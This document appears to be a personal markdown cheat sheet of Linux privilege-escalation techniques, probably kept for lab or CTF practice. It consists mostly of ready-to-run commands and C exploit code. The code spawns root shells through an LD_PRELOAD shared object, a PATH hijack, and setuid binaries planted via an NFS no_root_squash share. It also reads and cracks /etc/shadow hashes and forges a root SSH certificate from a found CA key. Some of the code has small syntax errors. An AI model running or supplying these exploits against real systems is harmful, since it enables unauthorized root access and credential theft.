
## NOTES
python3 -c 'import pty; pty.spawn("/bin/bash")' (for interactiveshell)

sudo su

**One liners**

```'python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'```

```base64 /etc/shadow | base64 --decode```

A lot of priviledge escalation is actually in ```https://gtfobins.org/``` for example using ```base64 /etc/shadow | base64 --decode``` to find password hashes. (john --wordlist=PASSWORDLIST HASH) to decrypt 

you can use **find / -type f -perm -04000 -ls 2>/dev/null** to find applications you have access too and **sudo -l** to find what sudo permissions you have access too.

```wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64```

- **sudo -l**
- **find / -group USER -type f 2>dev/null**
- **find / -type f -perm -04000 -ls 2>/dev/null**
- **getcap -r / 2>/dev/null**
- **cat /etc/crontab**
- **find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u**
- **cat /etc/exports**

## Kernel exploits
Metasploit has exploits that allow privileged escalation.
- Find the kernel version using **uname -r**
- Search for an exploit that works for the kernel version
- Run the exploit 

## Common
All based on ```https://gtfobins.org/```

- **Sudo** 
    - *You can see what sudo permissions you have available with* **sudo -l** 
- **UID**
    - *you can use* **find / -type f -perm -04000 -ls 2>/dev/null** *to find files UID bits set.*
- **Capabilities** 
    -  *you can use* **getcap -r / 2>/dev/null** *to find binaries that may allow elevated or specialized privileges.*
- **Crone tabs** /etc/crontab
    -  If crone tabs are set up incorrectly it's possible to add your own code like a **Reverse shell**


### LD_PRELOAD
Using **sudo -l** you an option may be avaiable called ```env_keep+=LD_PRELOAD``` which is another possible priviledge escalation method.


Name *Exploit.c*
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");  // Prevent recursive loading
    setgid(0);               // Set group ID to root
    setuid(0);               // Set user ID to root
    system("/bin/bash");     // Spawn a root shell
}
```
Complie this text as a shared extension
**gcc -fPIC -shared -o Exploit.so Exploit.c -nostartfiles** 

- *fPIC	Generates Position-Independent Code required for shared libraries.*
- *-shared	compiles to a shared object .so*
- *-o Exploit.so    |    output filename.*
- *Exploit.c    |    input file.*
- *nostartfiles	Prevents standard startup routines so _init() executes immediately.*

**Finnaly** ```sudo LD_PRELOAD=./Exploit.so <allowed_binary>```

**Allowed binary** *= What commands you have access to in sudo -l*

## $Path
Use **echo $PATH** 

**$PATH** escalation occurs when a high privilege executable like a SUID binary calls a system command e.g ls, cat, echo using a relative path rather than an absolute path e.g bin/ls. Linux $PATH looks through files left to right.

**find / -writable 2>/dev/null** find writeable files. 

**find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u** to hide running related proccesses. 

**exploit.c**
```
#include<unistd.h>
void main()
{ setuid(0);
  setgid(0);
  system("path");
}
```
* gcc exploit.c -o path -w *Complies code*
* chmod u+s path *Changes file permissions*
* export PATH=/tmp:$PATH *Creates a file in $PATH*
* echo "/bin/bash" > /tmp/path
* chmod 777 /tmp/path
* ./path
 



## NFS
**Networld FIle System** escalation occurs when the system is misconfigured, allowing an attacker to connect their own file system to the victim's system. This can happen if NFS shares are improperly set up, particularly when options like **no_root_squash** are enabled.

**Victim**
- cat /etc/exports to find **no_root_squash**
**Attacker**
- showmount -e **IP_ADDRESS** | Shows mounted drives.
- mkdir **MOUNTED DRIVES**/attack
**MOUNTED DRIVES**/attack/exploit.c
```
#include <unistd.h>
#include <stdlib.h>
int main()
{ setgid(0)
  setuid(0)
  system("/bin/bash");
  return 0;
}
```
- gcc explot.c -o exploit -w
- chmod +s exploit


## Public ssh keys
```- ssh-keygen -t rsa -b 4096 -f /tmp/id_rsa -N ""```

Explanation:

    - t rsa → generate RSA key
    - b 4096 → strong key size
    - f /tmp/id_rsa → save private key at /tmp/id_rsa
    - N "" → no passphrase (so we can use it non-interactively)
 
```ssh-keygen -s /opt/principal/ssh/ca -I "Exploit" -n root -V +1h /tmp/id_rsa.pub```

Explanation:

    - s /opt/principal/ssh/ca → use the CA private key to sign
    - I "Exploit" → certificate identity (just a label)
    - n root → this defines which user we are allowed to authenticate as
    - V +1h → certificate validity (valid for 1 hour)
    - /tmp/id_rsa.pub → the public key we are signing
    
```ssh -i /tmp/id_rsa root@localhost```






